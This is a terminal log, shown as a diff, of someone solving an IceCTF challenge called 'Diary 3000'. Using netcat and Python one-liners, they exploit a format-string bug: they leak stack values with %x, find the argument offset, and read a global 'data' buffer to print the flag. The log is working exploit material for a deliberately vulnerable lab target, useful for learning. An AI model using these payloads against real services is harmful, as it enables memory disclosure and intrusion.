@@ -1,0 +1,57 @@
+root@kali32:~$ nc diary.vuln.icec.tf 6501
+-- Diary 3000 --
+
+1. add entry
+2. print latest entry
+3. quit
+> 1
+Tell me all your secrets: AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
+
+1. add entry
+2. print latest entry
+3. quit
+> 2
+AAAA f763e836 f77b5000 ff918768 ff919b68 0 a 4e98bd00 0 0 ff919b78 804888c ff918768 4 f77b5c20 0 0 1 41414141 20782520
+
+1. add entry
+2. print latest entry
+3. quit
+
+root@kali32:~$ python -c 'print "1\nAAAA %18$x\n2\n3\n"' | nc diary.vuln.icec.tf 6501
+-- Diary 3000 --
+
+1. add entry
+2. print latest entry
+3. quit
+> Tell me all your secrets:
+1. add entry
+2. print latest entry
+3. quit
+> AAAA 41414141
+
+1. add entry
+2. print latest entry
+3. quit
+
+root@kali32:~$ nm dear_diary_bbba60f4be1b430bc890801f70c69f8177e8d2832f9b3bb431afbee069bddfb0 | grep data
+0804a0a0 B data
+0804a03c D __data_start
+0804a03c W data_start
+0804a044 D _edata
+
+root@kali32:~$ python -c 'from struct import pack; print "1\n" + pack("I", 0x0804a0a0) + "%18$s\n2\n3\n"' | nc diary.vuln.icec.tf 6501
+-- Diary 3000 --
+
+1. add entry
+2. print latest entry
+3. quit
+> Tell me all your secrets:
+1. add entry
+2. print latest entry
+3. quit
+> �IceCTF{this_thing_is_just_sitting_here}
+
+
+1. add entry
+2. print latest entry
+3. quit
